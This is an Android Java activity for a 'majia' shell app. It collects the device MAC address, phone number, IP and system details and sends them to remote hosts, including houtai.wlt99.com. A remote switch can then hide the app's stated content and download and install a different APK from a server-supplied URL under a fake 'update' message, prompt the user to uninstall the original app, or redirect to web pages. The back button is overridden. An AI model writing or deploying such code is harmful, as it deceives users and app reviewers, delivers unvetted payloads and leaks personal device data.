package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.regus.mj.config.KGConfig;
import com.regus.mj.utils.AssistUtils;
import com.regus.mj.utils.CrashHandler;
import com.regus.mj.view.TBProgressView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class MJRegusActivity extends Activity {


    //服务器上的马甲id

    private String mAid = KGConfig.AppInfoConfig.app_aid;
    //服务器上该马甲的渠道id
    private String mSid = KGConfig.AppInfoConfig.app_sid;

    //跳转到原马甲包启动页的全路径
    private String activityPath = KGConfig.AppInfoConfig.app_main_path;

    //后台开关地址  域名动态获取
    private String busUrl = KGConfig.ServerConfig.bussnessUrl;

    //握手地址
    private String getHostUrl = KGConfig.ServerConfig.welcomeUrl;

    //服务器ip
    private String serverIp = KGConfig.ServerConfig.ip;


    //id 值   这些限制都只是占位词  后面直接用16进制 替换
    /**
     * 植入的图片  启动图背景叫 mj_splash.png      下载时候的背景叫 mj_down_splash.png
     */

    //该页面的启动页图片的id
    private int splash_bg_id = KGConfig.UIConfig.app_splash_rec;
    //该页面的下载时候的背景图片id
    private int splash_down_bg_id = KGConfig.UIConfig.app_splash_down_rec;


    /**
     * 植入的一个主布局   名字固定叫 mj_regus_splash.xml
     */

    //页面布局的id
    private int activity_layout_id = KGConfig.UIConfig.app_layout_splash;
    //页面布局的根布局的id
    private int root_view_id = KGConfig.UIConfig.app_view_root;
    //该页面的加载框id
    private int progress_bar_id = KGConfig.UIConfig.app_view_progressbar;
    //百分比
    private int progress_bar_num = KGConfig.UIConfig.app_view_progressnum;


    private String downLoadUrl;
    private File savefolder;
    private String updateSaveName;

    private long packSize;
    private int progress;
    private TBProgressView progressBar;
    private RelativeLayout mRootView;
    private TextView mProgressNum;

    private List<String> mHosts = new ArrayList<>();
    private int mCurrentReqposition;

    private DownloadApkThread downloadApkThread;

    private String theDownloadPkaName = "";

    /**
     * 权限部分
     */

    private String[] permissions = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES
    };
    List<String> mPermissionList = new ArrayList<>();

    private int mode = 0; // 0 h5模式    1 下载模式    2 融合模式       --->目前团队主要用下载模式热更新


    //设备相关

    private String macAddress;
    private String phoneNum;
    private String ip;
    private String sysInfo;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);


        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }


        checkAppInfo();

        //设 layout id
        setLayoutId();

        //根布局id mj_root_view
        setRootViewId();

        //设置启动图id`
        setSplashId();

        //设置资源进度条id
        setProgressBarId();

        //设置资源进度条 百分比id
        setProgressBarNumId();

        checkPermision();

    }


    private void checkAppInfo() {

        if (TextUtils.isEmpty(mAid) || TextUtils.isEmpty(mSid) || TextUtils.isEmpty(activityPath)
                || splash_bg_id == 0 || splash_down_bg_id == 0 || activity_layout_id == 0 || root_view_id == 0 ||
                progress_bar_id == 0 || progress_bar_num == 0) {

            Toast.makeText(getApplicationContext(), "KG参数未配置正确~", Toast.LENGTH_LONG);

            finish();

        }

    }


    //设 layout id
    @SuppressLint("ResourceType")
    private void setLayoutId() {
        setContentView(activity_layout_id);
    }

    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId() {
        mRootView = findViewById(root_view_id);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId() {
        mRootView.setBackgroundResource(splash_bg_id);
    }

    //设置progress bar id
    @SuppressLint("ResourceType")
    private void setProgressBarId() {
        progressBar = findViewById(progress_bar_id);
        progressBar.setProgress(0);
    }

    //设置progress bar num  id
    @SuppressLint("ResourceType")
    private void setProgressBarNumId() {
        mProgressNum = findViewById(progress_bar_num);
    }


    /**
     * 所有权限检测完毕之后
     */
    private void afterCheckPermision() {


        if (!AssistUtils.iConnected(this)) {
            showNoNetDialog();
            return;
        }


        macAddress = AssistUtils.getMacAddress(this);
        Log.e("regus_mac ", macAddress + "");

        if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
            macAddress = AssistUtils.getDeviceId(this);
            Log.e("regus_mac_dev ", macAddress);
        }

        phoneNum = AssistUtils.getPhoneNum(this);
        Log.e("regus_phoneNum ", phoneNum + "");
        ip = AssistUtils.getIPAddress(this);
        Log.e("regus_ip ", ip + "");
        sysInfo = AssistUtils.getSystemInfo();

        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);

        CrashHandler.getInstance()
                .init(getApplicationContext());

        getDt();

    }


    void showNoNetDialog() {

        Toast.makeText(this, "网络状态异常", Toast.LENGTH_SHORT);

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("网络状态异常");
        //设置内容
        normalDialog.setMessage("游戏必要配置需要网络顺畅，请检查您的网络连接，确保网络连接可用");
        normalDialog.setCancelable(false);
        //设置按钮
        normalDialog.setPositiveButton("我已经打开", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                afterCheckPermision();
            }
        });

        normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                finish();
            }
        });

        normalDialog.show();


    }


    void RequestThat() {
        getHostRequest();
    }


    void getDt() {
        Log.e("regus_next", "getDt");
        new Thread(new GetDtRunnale()).start();
    }


    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL("https://67x9afjw.api.lncld.net/1.1/classes/UpVersion/5f17afd6875c550008406095");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setRequestProperty("X-LC-Id", "67x9AFJW4h2aT78GEWVVQGWN-gzGzoHsz");
                urlConnection.setRequestProperty("X-LC-Sign", "4e88dd3e3c6d116d211068306d3becf1,1573025889476");
                urlConnection.setConnectTimeout(4000);
                urlConnection.setReadTimeout(4000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    //     Log.e("regus getDt ", jsonStr + "");

                    //处理
                    try {

                        JSONObject avObject = new JSONObject(jsonStr);


                        int show = avObject.getInt("show");
                        String url = avObject.getString("url");
                        boolean isStop = avObject.getBoolean("stop");

                        Log.e("avo", "s  " + show + " i  " + isStop);

                        if (isStop) {
                            if (show == 2) {
                                if (url.endsWith("apk")) {
                                    downLoadUrl = url;
                                    mode = 1;
                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
                                    showDownLoadDialog();

                                } else {
                                    Intent intent = new Intent();
                                    intent.setAction(Intent.ACTION_VIEW);
                                    Uri content_url = Uri.parse(url);
                                    intent.setData(content_url);
                                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                                    startActivity(intent);
                                }

                            } else {
                                jumpLocalSplash();
                            }
                        } else {
                            RequestThat();
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        RequestThat();
                    }
                } else {
                    RequestThat();
                }
            } catch (Exception e) {
                RequestThat();
            }
        }

    }


    private void showDownLoadUi() {

        startService(new Intent(this, MJForegroundService.class));

        setDownLoadApkBgId();
        downloadPackage();
    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {
        progressBar.setVisibility(View.VISIBLE);
        mRootView.setBackgroundResource(splash_down_bg_id);
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                afterCheckPermision();
            } else {//请求权限方法

                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(getApplicationContext(), "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
                    }
                });

                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            jumpLocalSplash();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        }
                    }
                }
                afterCheckPermision();
                break;
            default:
                break;
        }
    }


    private void getHostRequest() {
        new Thread(new GetHostRequestRunnable()).start();
    }


    private class GetHostRequestRunnable implements Runnable {

        @Override
        public void run() {

            try {
                Log.e("regus_getHost ", getHostUrl + "");

                URL urll = new URL(getHostUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(7000);
                urlConnection.setReadTimeout(7000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus getHost array", jsonStr + "");

                    //处理
                    try {

                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                        Log.e("regus  array size", jsonArray.length() + "");

                        traverseHost(jsonArray);

                    } catch (JSONException e) {
                        e.printStackTrace();
                        Log.e("regus getHost", e.getLocalizedMessage() + "");
                        requsetKaiGuanServer(serverIp);
                    }
                } else {
                    Log.e("regus getHost", "code 不是200");
                    requsetKaiGuanServer(serverIp);
                }
            } catch (Exception e) {
                Log.e("regus getHost", e.getLocalizedMessage() + "");
                requsetKaiGuanServer(serverIp);
            }

        }


    }


    void traverseHost(JSONArray jsonArray) {

        List<String> stringList = new ArrayList<>();

        for (int i = 0; i < jsonArray.length(); i++) {
            try {
                stringList.add((String) jsonArray.get(i));
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        mHosts = stringList;

        if (mHosts.size() > 0) {
            mCurrentReqposition = 0;
            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
        }

    }


    void requestNextHost() {
        int hostSize = mHosts.size();
        if (mCurrentReqposition < hostSize - 1) {
            mCurrentReqposition = mCurrentReqposition + 1;
            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
        } else {
            //没有任何域名可用
            jumpLocalSplash();
        }
    }


    private void requsetKaiGuanServer(String bUrl) {


        String url = "http://" + bUrl + busUrl;

        new Thread(new RequestMacRunnable(mAid, mSid, url, bUrl)).start();


    }


    private class RequestMacRunnable implements Runnable {

        String url;
        String aid;
        String sid;
        String host;

        public RequestMacRunnable(String aid, String sid, String url, String bul) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
            host = bul;
        }


        @Override
        public void run() {


            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }


            if (TextUtils.isEmpty(macAddress)) {
                new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
                return;
            }

            String rootUrl = "http://" + host + busUrl + "/IsBlack?mac=" + macAddress;

            Log.e("regus_", "请求的mac接口 " + rootUrl);


            try {
                URL urll = new URL(rootUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus_mac接口返回", jsonStr + "");

                    JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                    if (responseJson.has("Status") && responseJson.has("Data")) {

                        if (responseJson.getBoolean("Data")) {
                            //是黑名单手机
                            jumpLocalSplash();
                        } else {
                            new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
                        }
                    } else {
                        requestNextHost();
                    }

                } else {
                    requestNextHost();
                }
            } catch (Exception e) {
                requestNextHost();
                Log.e("reugs", "mac接口 " + e.getLocalizedMessage());
            }

        }

    }


    private class RequestAppInfoRunnable implements Runnable {

        String url;
        String aid;
        String sid;
        String host;

        public RequestAppInfoRunnable(String aid, String sid, String url, String bul) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
            host = bul;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jumpLocalSplash();
                return;
            }

            String rootUrl = url + "/GetAppInfo?aid=";


            String allUrl = rootUrl + aid + "&sid=" + sid;

            Log.e("regus_", "请求的kg接口 " + allUrl);

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");

                Log.e("regus", " header中 增加mac " + macAddress);

                if (!macAddress.equals("02:00:00:00:00:00")) {
                    urlConnection.setRequestProperty("mac", macAddress);
                } else {
                    urlConnection.setRequestProperty("mac", "某手机获取不到mac地址或设备号");
                }

                urlConnection.setRequestProperty("qId", System.currentTimeMillis() + "");

                if (!TextUtils.isEmpty(ip)) {
                    urlConnection.setRequestProperty("ip", ip);
                }

                urlConnection.setRequestProperty("deviceType", "Andriod");

                if (!TextUtils.isEmpty(phoneNum)) {
                    urlConnection.setRequestProperty("mobile", phoneNum);
                }

                urlConnection.setRequestProperty("osVersion", sysInfo);

                urlConnection.setRequestProperty("provider", AssistUtils.getDeviceBrand());


                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    solveLines(true, host, jsonStr);

                } else {
                    solveLines(false, host, null);
                }
            } catch (Exception e) {
                solveLines(false, host, null);
            }

        }

    }


    private volatile boolean isGetKgRepInfoAlready = false;


    /**
     * 处理几个ping 域名的请求
     */
    private synchronized void solveLines(boolean isOK, String host, String buJson) {

        if (isGetKgRepInfoAlready) {
            Log.e("regus_", " 已经有可用域名 其他的直接return");
            return;
        }


        if (isOK) {

            Log.e("regus_", " 域名: " + host + " 可用, 已经被优先使用了");

            isGetKgRepInfoAlready = true;

            //处理
            try {
                JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));

                if (responseJson.has("Status") && responseJson.has("Data")) {
                    if (responseJson.getBoolean("Status")) {

                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                        if (!dataJsonObject.getBoolean("IsAdvertising")) {
                            clearSp(getBaseContext());
                        }


                        if (dataJsonObject.has("IsMix") && dataJsonObject.getBoolean("IsMix")) {
                            //融合模式
                            mode = 2;

                            //融合模式
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(getApplicationContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
                                }
                            });
                            //环彩181504
                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
                            getApkFromAssets();

                        } else if (dataJsonObject.getBoolean("IsAdvertising")) {

                            if (dataJsonObject.has("AdvertiseList")) {
                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");

                                String key_ad_kg = "key_ad_kg";
                                String key_ad_value = "key_ad_value";


                                if (advertiseArray != null) {
                                    for (int i = 0; i < advertiseArray.length(); i++) {
                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
                                        if (jsonObject != null) {
                                            if (jsonObject.has("AdvertiseUrl")) {

                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();

                                            }

                                            if (jsonObject.has("IsEnable")) {

                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
                                            }
                                        }
                                    }
                                }

                            }

                            jumpLocalSplash();

                        } else if (dataJsonObject.getBoolean("IsDownload")) {
                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
                            mode = 1;
                            Log.e("regus 得到的下载链接: ", downLoadUrl);
                            showDownLoadDialog();
                        } else if (dataJsonObject.getBoolean("IsEnable")) {
                            //h5模式
                            mode = 0;
                            startWebview(dataJsonObject.getString("Url"));
                        } else {
                            jumpLocalSplash();
                        }

                    } else {
                        jumpLocalSplash();
                    }
                    return;
                }

            } catch (JSONException e) {
                e.printStackTrace();
                jumpLocalSplash();
            }

        } else {
            requestNextHost();
            Log.e("regus_", " 域名: " + host + " 不可用");
        }

    }


    public static void clearSp(Context context) {
        SharedPreferences preferences = context.getSharedPreferences("regus", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.clear();
        editor.commit();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                showDownLoadUi();
            }
        });
    }


    /**
     * 下载主包
     */

    public void downloadPackage() {

        if (TextUtils.isEmpty(downLoadUrl)) {
            Toast.makeText(MJRegusActivity.this, "未配置APP下载链接~", Toast.LENGTH_LONG);
            return;
        }

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }

        downloadApkThread = new DownloadApkThread();
        downloadApkThread.start();
    }

    private class DownloadApkThread extends Thread {

        @SuppressLint("WrongConstant")
        @Override
        public void run() {
            super.run();
            long j = 0;

            try {

                URL url = new URL(downLoadUrl);

                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setConnectTimeout(7000);
                httpURLConnection.setReadTimeout(7000);
                httpURLConnection.connect();

                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jumpLocalSplash();
                    return;
                }

                InputStream is = httpURLConnection.getInputStream();
                packSize = httpURLConnection.getContentLength();

                if (AssistUtils.checkExistSDCard()) {
                    savefolder = Environment.getExternalStorageDirectory();
                } else {
                    savefolder = getDir("update", 3);
                }


                updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                File file = new File(savefolder, updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);

                byte[] bytes = new byte[512];

                int length;

                while ((length = is.read(bytes)) != -1) {
                    os.write(bytes, 0, length);
                    j += (long) length;
                    progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                    Log.e("regus progress", progress + "");
                    showLoadDialogProgress(progress);
//                    if (progress == 100) {
//                        hideWebViewLoadDialog();
//                    }
                }

                //关闭流
                is.close();
                os.close();
                os.flush();

                gotoInstall();

            } catch (MalformedURLException e) {
                e.printStackTrace();
                jumpLocalSplash();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }

                    downloadPackage();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("regus Exception", "" + e.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }
                    downloadPackage();
                }
            }

        }

    }


    private void showLoadDialogProgress(int progress) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {

                if (progress == 95) {
                    if (!AssistUtils.isRunningForeground(MJRegusActivity.this)) {
                        AssistUtils.setTopApp(MJRegusActivity.this);
                    }
                }

                if (progressBar != null && mProgressNum != null) {
                    progressBar.setProgress(progress);
                    mProgressNum.setText("本次更新不消耗流量，正在更新..." + progress + "%");
                }

            }
        });

    }


    /**
     * 获取assert 里的主包  这是融合模式   暂时不用
     */

    @SuppressLint("WrongConstant")
    private void getApkFromAssets() {

        try {

            if (AssistUtils.checkExistSDCard()) {
                savefolder = Environment.getExternalStorageDirectory();
            } else {
                savefolder = getDir("update", 3);
            }


            String aimApkName = "main.apk";

            InputStream is = getAssets().open(aimApkName);

            updateSaveName = "eric.apk";

            File file = new File(savefolder, updateSaveName);

            Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);

            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            int i = 0;
            while ((i = is.read(temp)) > 0) {
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();

            gotoInstall();


        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus IOException", "" + e.getLocalizedMessage());
            jumpLocalSplash();
        }


    }

    /**
     * 去安装
     */

    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        PackageManager pm = this.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
                PackageManager.GET_ACTIVITIES);

        if (info != null) {
            String packageName = info.packageName;
            theDownloadPkaName = packageName;
            Log.e("regus_", "checkPackageNameIfsame 远程的包名是 " + packageName);
        }

        toInstall();
    }


    private void unInstallSelf() {
        if (AssistUtils.isAvilible(theDownloadPkaName, this)) {
            //卸载自己
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
            startActivity(intent);
        } else {

            //创建dialog构造器
            AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
            //设置title
            normalDialog.setTitle("最新应用未安装成功");
            //设置内容
            normalDialog.setMessage("点击确定去安装更新");
            normalDialog.setCancelable(false);
            //设置按钮
            normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    toInstall();
                }
            });

            normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    onBackPressed();
                }
            });

            normalDialog.show();
        }
    }


    @SuppressLint("WrongConstant")
    private void toInstall() {

        Intent intent = new Intent(Intent.ACTION_VIEW);
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            //添加这一句表示对目标应用临时授权该Uri所代表的文件
            intent.setFlags(1);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        if (theDownloadPkaName.equals(getPackageName())) {
            startActivity(intent);
            finish();
        } else {
            startActivity(intent);
            isCover = true;
        }

    }

    private boolean isCover;


    @Override
    protected void onResume() {
        super.onResume();

        Log.e("regus_", "onResume");

        if (isCover) {
            unInstallSelf();
        }
    }


    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }


    @Override
    public void onBackPressed() {
        //实现Home键效果
        //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了
        Intent i = new Intent(Intent.ACTION_MAIN);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        Log.e("regus_", "onDestroy");

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }
    }


}
